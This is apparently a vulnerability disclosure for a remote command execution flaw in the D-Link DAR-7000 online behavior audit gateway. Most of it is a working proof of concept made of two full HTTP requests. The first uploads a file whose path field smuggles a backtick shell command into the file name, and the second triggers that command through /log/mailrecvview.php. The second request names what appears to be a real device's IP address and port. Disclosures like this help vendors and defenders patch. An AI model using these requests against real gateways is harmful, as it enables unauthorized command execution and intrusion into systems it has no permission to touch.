The D-LINK DAR-7000 series online behavior audit gateway has a RCE vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000  DAR V31R02B1413C

Vulnerability Path ：/log/mailrecvview.php

<img width="673" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/b2e0591b-ddc5-4c9b-9028-44b988a5352b">



First construct POC and upload command execution files
```
POST /Tool/uploadfile.php? HTTP/1.1
Host:
Cookie: PHPSESSID=25c62fc086a2f7777b8e0dd04d2a75d1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------886123294864872782496578758
Content-Length: 324
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="file_upload"; filename="1.txt"
Content-Type: application/octet-stream

1
-----------------------------886123294864872782496578758
Content-Disposition: form-data; name="txt_path"

/usr/hddocs/nsg/home/`sleep${IFS}10`.txt

```
<img width="680" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/e64a1c3c-42d4-457f-8307-4cc40e77cfee">



Log in to the system, access the uploaded file, and successfully execute the system command
```
GET /log/mailrecvview.php?file=/usr/hddocs/nsg/home/`sleep${IFS}10`.txt&type=%51%51%20%57%65%62%4d%61%69%6c HTTP/1.1
Host: 60.22.74.195:8443
Cookie: PHPSESSID=bdb1aa1392da0420192cff3c34e507d6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 219.142.42.9
Te: trailers
Connection: close

```
<img width="684" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/6f76fff3-1b15-4709-baf0-174f7553a261">

